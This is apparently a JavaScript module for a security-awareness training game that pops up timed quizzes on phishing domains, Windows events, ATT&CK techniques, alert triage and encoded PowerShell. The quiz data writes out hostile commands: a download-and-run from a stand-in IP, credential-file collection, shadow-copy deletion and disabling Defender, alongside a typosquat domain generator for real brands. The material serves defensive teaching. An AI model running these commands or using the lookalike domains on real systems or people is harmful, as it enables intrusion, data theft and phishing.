// Pop incidents: short timed scenarios that interrupt you (gently) while the tab is open.
// Generated from templates + live data, with a no-repeat memory, so they rarely repeat.
import { $, h, put, store, pick, shuffle, rnd, fresh, RM, toast, num, on } from "./core.js";
import { sting, sfx } from "./audio.js";
import { bump, earn, xp } from "./state.js";
import { loaded, cveList } from "./data.js";
import { EVENTS, ATTACK, LH_GOOD, LH_BAD } from "./content/legacy.js";

const BRANDS = ["microsoft", "okta", "paypal", "github", "google", "docusign", "dropbox", "zoom", "slack", "atlassian", "salesforce", "adobe", "linkedin", "wetransfer", "servicenow", "workday"];
const TLDS = [".com", ".com", ".com", ".net", ".io"];
const PEOPLE = ["Kevin from Finance", "Helen in HR", "the CFO", "a contractor", "the intern", "Priya in Network", "Dan in DevOps", "the sales VP", "a service account", "the CEO's assistant"];
const COUNTRIES = ["Brazil", "Nigeria", "Romania", "Vietnam", "the Netherlands", "Russia", "an anonymising VPN", "a cloud provider in Frankfurt", "a residential proxy in Ohio"];
const HOSTS = ["FIN-LT-042", "HR-LT-007", "DC01", "FILESRV-02", "SQL-PROD-1", "JUMP-01", "WEB-DMZ-3", "DEV-LT-113", "EXCH-01", "PRINTER-3F-02"];

function fakeDomain(b) {
  const t = pick(TLDS);
  const tricks = [
    () => b.replace("m", "rn") + t, () => b.replace("l", "1") + t, () => b.replace("o", "0") + t, () => b + "-secure" + t,
    () => b + "-login" + t, () => b.slice(0, -1) + t, () => b + b.slice(-1) + t, () => `${b}.com.account-verify${t}`,
    () => `login-${b}${t}`, () => b + ".co", () => b.replace(/([aeiou])/, "$1$1") + t, () => `${b}-support-desk${t}`,
  ].filter((f) => f() !== b + t);
  return pick(tricks)();
}
function b64utf16(s) { let bin = ""; for (const ch of s) { const c = ch.charCodeAt(0); bin += String.fromCharCode(c & 255, c >> 8); } return btoa(bin); }

const ALERTS = [
  { s: (p, c) => `${p} signed in from ${c} 9 minutes after signing in from Singapore.`, a: "Revoke sessions, reset, check MFA and mailbox rules", w: "Impossible travel plus a fresh session is a classic sign of a stolen session token or password. Contain the account first.", wrong: ["Close it, people travel", "Bounce it to IT as a password reset"] },
  { s: (p) => `${p} approved the 23rd MFA push in 4 minutes. At 02:40.`, a: "Treat as MFA fatigue: reset, revoke sessions, call the user", w: "Push spam until someone taps Approve is MFA fatigue. The approval means the attacker likely has the password too.", wrong: ["Close it, they approved it", "Ask them to approve faster next time"] },
  { s: (p, c, x) => `${x}: 1,800 files renamed to .lock in 3 minutes.`, a: "Isolate the host now, then work out scope", w: "Mass renames with a new extension is ransomware encryption in progress. Isolate first, investigate second.", wrong: ["Open a low-priority ticket", "Ask the user if they renamed them"] },
  { s: (p, c, x) => `Unknown process opened a handle to lsass.exe on ${x}.`, a: "Investigate as credential dumping, consider isolating", w: "LSASS holds credentials in memory. Unexpected access is a strong credential theft signal (T1003.001).", wrong: ["Ignore, Windows does that", "Reboot the host to clear it"] },
  { s: (p) => `New inbox rule for ${p}: forward everything with "invoice" to an external Gmail.`, a: "Remove the rule, revoke sessions, hunt for the sign-in that made it", w: "External forwarding rules are a hallmark of business email compromise. Someone else is reading that mailbox.", wrong: ["Leave it, maybe they work from home", "Bounce to IT as an Outlook question"] },
  { s: (p, c, x) => `A new service called "WinUpdateHelper" was installed on ${x} from a temp folder.`, a: "Investigate as persistence, check the binary and who installed it", w: "Services running from temp folders with friendly names are a common persistence trick (T1543.003).", wrong: ["It says update, so it's fine", "Bounce to IT, they do updates"] },
  { s: (p, c, x) => `${x} sends a 412-byte HTTPS request to the same new domain every 60 seconds.`, a: "Investigate as C2 beaconing", w: "Regular, small, repeated connections to a new domain look like malware beaconing home.", wrong: ["Close it, it's just HTTPS", "Bounce to Network as a bandwidth issue"] },
  { s: () => `An AWS access key was used from an ASN you've never seen, calling ListBuckets on everything.`, a: "Disable the key, check CloudTrail for what else it did", w: "Enumeration from a new network with a long-lived key usually means the key leaked (often from a repo).", wrong: ["Wait for the monthly cloud review", "Increase the S3 storage quota"] },
  { s: (p) => `${p} says a "Microsoft technician" asked them to install Quick Assist and is now on the call.`, a: "Tell them to hang up and disconnect, then isolate and investigate", w: "Remote-help scams are used by ransomware crews to get hands-on access. Break the session first.", wrong: ["Let the technician finish", "Bounce to IT, it's a support call"] },
  { s: (p, c, x) => `Winword.exe on ${x} launched powershell.exe with -enc.`, a: "Investigate as a malicious document", w: "Office spawning encoded PowerShell is the textbook malicious-macro chain (T1566.001 → T1059.001).", wrong: ["Close it, Word uses PowerShell", "Ask the user to stop using Word"] },
  { s: (p, c, x) => `Event 1102 on ${x}: the security audit log was cleared.`, a: "Treat as anti-forensics: find who cleared it and why", w: "Clearing the security log is rarely legitimate and often means someone is covering tracks (T1070.001).", wrong: ["Close it, logs get full", "Bounce to IT for log rotation"] },
  { s: (p) => `${p} can't print to the 3rd floor printer.`, a: "Bounce to IT", w: "Printers are IT's. Unless the printer is beaconing to another country, which, honestly, check later.", wrong: ["Isolate the printer", "Escalate to IR"] },
  { s: (p) => `${p} wants a firewall rule opened to their home IP for "just a quick test".`, a: "Bounce to Network, and flag the risk", w: "Firewall changes belong to Network with change control. The SOC can note the risk.", wrong: ["Open it yourself, it's quick", "Escalate to the CISO immediately"] },
  { s: (p, c, x) => `EDR blocked mimikatz.exe on ${x}. The user is a pentester with an approved engagement.`, a: "Verify the engagement scope and timing, then document", w: "Approved tests still need checking: right host, right dates, right person. Trust, but verify.", wrong: ["Close it, pentesters are fine", "Isolate the pentester"] },
  { s: () => `A burst of 4625 failures for 300 different usernames from one IP against your VPN.`, a: "Block the source, check for any success, consider lockout policy", w: "Many usernames, few tries each, one source: password spraying. The important question is whether any succeeded.", wrong: ["Close it, those are failures", "Reset all 300 passwords"] },
];

const TEMPLATES = {
  typo() {
    const b = pick(BRANDS); const fake = fakeDomain(b);
    const legit = shuffle([`${b}.com`, `login.${b}.com`, `support.${b}.com`, `www.${b}.com`]).slice(0, 2);
    const opts = shuffle([fake, ...legit]);
    return { k: "Phish check", q: `An email says your ${b[0].toUpperCase() + b.slice(1)} password expires today. Which link is the fake?`, o: opts, a: opts.indexOf(fake), w: `${fake} only looks like ${b}. Read domains right to left: the part before the final dot-com is who you're really talking to.` };
  },
  event() {
    const [id, desc] = pick(EVENTS); const others = shuffle(EVENTS.filter((e) => e[0] !== id)).slice(0, 2).map((e) => e[1]);
    const opts = shuffle([desc, ...others]);
    return { k: "Event ID", q: `Windows event ${id} just fired on ${pick(HOSTS)} at 0${Math.floor(rnd() * 5)}:${String(Math.floor(rnd() * 60)).padStart(2, "0")}. What does it mean?`, o: opts, a: opts.indexOf(desc), w: `Event ${id}: ${desc}` };
  },
  attack() {
    const [id, name] = pick(ATTACK); const others = shuffle(ATTACK.filter((e) => e[0] !== id)).slice(0, 2).map((e) => e[1]);
    const opts = shuffle([name, ...others]);
    return { k: "ATT&CK", q: `The detection is tagged ${id}. What technique is that?`, o: opts, a: opts.indexOf(name), w: `${id} is ${name} in MITRE ATT&CK.` };
  },
  alert() {
    const A = pick(ALERTS); const opts = shuffle([A.a, ...A.wrong]);
    return { k: "Triage call", q: A.s(pick(PEOPLE), pick(COUNTRIES), pick(HOSTS)), o: opts, a: opts.indexOf(A.a), w: A.w };
  },
  encoded() {
    const cmds = [
      ["IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a.ps1')", "Downloads a script from the internet and runs it in memory"],
      ["Get-ChildItem C:\\Users -Recurse -Include *.kdbx,*.pfx | Compress-Archive -DestinationPath C:\\ProgramData\\x.zip", "Collects password databases and certificates into a zip for theft"],
      ["vssadmin delete shadows /all /quiet", "Deletes backups (shadow copies), typical ransomware prep"],
      ["Set-MpPreference -DisableRealtimeMonitoring $true", "Turns off Defender real-time protection"],
      ["Get-Date", "Prints the current date. Harmless, but why encode it?"],
      ["net group \"Domain Admins\" /domain", "Lists domain admins: reconnaissance for privilege escalation"],
    ];
    const [cmd, ans] = pick(cmds); const enc = b64utf16(cmd);
    const opts = shuffle([ans, ...shuffle(cmds.filter((c) => c[1] !== ans)).slice(0, 2).map((c) => c[1])]);
    return { k: "Decode it", q: `powershell.exe -nop -w hidden -enc ${enc.slice(0, 64)}${enc.length > 64 ? "…" : ""}\nWhat does it do?`, mono: true, o: opts, a: opts.indexOf(ans), w: `Decoded (UTF-16LE base64): ${cmd}`, full: enc };
  },
  hash() {
    const kinds = [[32, "MD5"], [40, "SHA-1"], [64, "SHA-256"]]; const [len, name] = pick(kinds);
    let s = ""; for (let i = 0; i < len; i++) s += "0123456789abcdef"[Math.floor(rnd() * 16)];
    const opts = shuffle(kinds.map((k) => k[1]));
    return { k: "Hash ID", q: `Threat intel shared this hash:\n${s}\nWhich algorithm is it?`, mono: true, o: opts, a: opts.indexOf(name), w: `${len} hex characters = ${len * 4} bits = ${name}. MD5 is 32, SHA-1 is 40, SHA-256 is 64.` };
  },
  proc() {
    const bad = pick(LH_BAD); const good = shuffle(LH_GOOD).slice(0, 2); const badLine = Array.isArray(bad) ? bad[0] : bad;
    const opts = shuffle([badLine, ...good]);
    return { k: "Log hunt", q: "Which process command line would you investigate?", mono: true, o: opts, a: opts.indexOf(badLine), w: Array.isArray(bad) && bad[1] ? bad[1] : "That one uses a living-off-the-land trick that legitimate software rarely needs." };
  },
  kev() {
    const c = cveList(loaded("cves")).find((x) => x.kev); if (!c) return TEMPLATES.alert();
    const ok = "Check if you run it, then patch or mitigate and hunt for compromise";
    const opts = shuffle([ok, "Wait for the next Patch Tuesday", "Email everyone to stop using the internet"]);
    return { k: "Live: CISA KEV", q: `CISA lists ${c.id} in ${[c.vendor, c.product].filter(Boolean).join(" ")} as exploited in the wild. What's first?`, o: opts, a: opts.indexOf(ok), w: c.action || "Known-exploited means attackers are already using it. Exposure check first, then fix, then look for signs it already happened." };
  },
};
const WEIGHTS = ["alert", "alert", "alert", "typo", "typo", "event", "attack", "encoded", "hash", "proc", "kev", "kev"];

let timer = 0, open = false;
export function generate() { const kind = fresh("miKind", WEIGHTS, (x) => x, 0.4); return (TEMPLATES[kind] || TEMPLATES.alert)(); }

export function drill(isDrill = true) {
  if (open) return; open = true; bump("drills");
  const s = generate(); const box = $("#miBox"); const T = 25;
  let left = T, done = false;
  const bar = h("i"); const res = h("div.mires", { "aria-live": "polite" });
  const finish = (i) => {
    if (done) return; done = true; clearInterval(tick);
    const ok = i === s.a; bump("incidents"); if (ok) { bump("incidentsRight"); earn(5, "incident"); xp(12, "incident"); }
    sting(ok ? "win" : "fail");
    btns.forEach((b, k) => { b.disabled = true; b.classList.toggle("right", k === s.a); b.classList.toggle("wrong", k === i && !ok); });
    put(res, h("p.mires-h", i === -1 ? "Time's up." : ok ? "Correct. +5 beans" : "Not quite."), h("p", s.w),
      h("button.btn.primary.sm", { onclick: close }, "Back to work"));
    res.querySelector("button").focus();
  };
  const btns = s.o.map((o, i) => h("button.miopt" + (s.mono ? ".mono" : ""), { onclick: () => finish(i) }, o));
  const close = () => { box.classList.remove("on"); open = false; setTimeout(() => box.replaceChildren(), 300); schedule(); };
  put(box, h("div.mihead", h("span.siren"), h("b", isDrill ? "Drill" : "Pop incident"), h("span.muted", s.k), h("span.grow"), h("button.xbtn", { "aria-label": "Dismiss", onclick: () => { if (!done) finish(-1); close(); } }, "×")),
    h("div.mibar", bar), h("p.miq" + (s.mono ? ".mono" : ""), s.q), h("div.miopts", btns), res);
  box.classList.add("on"); sting("alert"); setTimeout(() => btns[0]?.focus(), 50);
  bar.style.width = "100%";
  const tick = setInterval(() => { left -= 0.25; bar.style.width = (left / T) * 100 + "%"; if (left <= 0) finish(-1); }, 250);
}

export function popSettings() { return { on: store.get("popOn", true) !== false, every: num(store.get("popEvery", 40), 40, 10, 240) }; }
export function schedule() {
  clearTimeout(timer); const s = popSettings(); if (!s.on) return;
  const mins = s.every * (0.7 + rnd() * 0.6);
  timer = setTimeout(() => {
    const busy = document.body.dataset.busy === "1" || document.visibilityState !== "visible";
    if (busy) return schedule();
    drill(false);
  }, mins * 60e3);
}
export function startIncidents() { schedule(); on("popSettings", schedule); }
